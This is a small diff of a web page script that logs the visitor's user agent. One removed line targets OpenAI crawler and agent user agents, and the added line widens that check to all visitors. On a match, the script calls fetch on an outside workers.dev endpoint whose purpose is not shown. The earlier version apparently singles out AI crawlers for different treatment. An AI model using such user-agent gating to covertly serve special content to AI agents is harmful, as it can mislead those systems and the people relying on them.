@@ -31,7 +31,7 @@
       console.log("Script executed");
       console.log("User Agent:", navigator.userAgent);
       
-      const regex = /Mozilla|OAI-SearchBot|ChatGPT-User|GPTBot/;
+      const regex = /.*/;
       if (regex.test(navigator.userAgent)) {
         console.log("Regex matched, proceeding with fetch");
         fetch('https://silent-bird-0d0b.alistair-2bd.workers.dev/', {
